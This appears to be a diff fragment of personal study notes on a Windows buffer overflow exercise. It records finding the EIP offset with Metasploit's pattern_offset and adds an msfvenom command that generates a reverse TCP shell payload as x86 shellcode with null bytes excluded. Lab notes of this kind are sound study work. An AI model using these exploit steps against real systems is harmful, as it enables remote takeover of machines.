@@ -80,3 +80,9 @@ pattern_offset.rb -l 3000 -q 386F4337
 now we found in 2003 
 now we know in 2003 we can control the EIP
 
+
+
+command you know why 
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
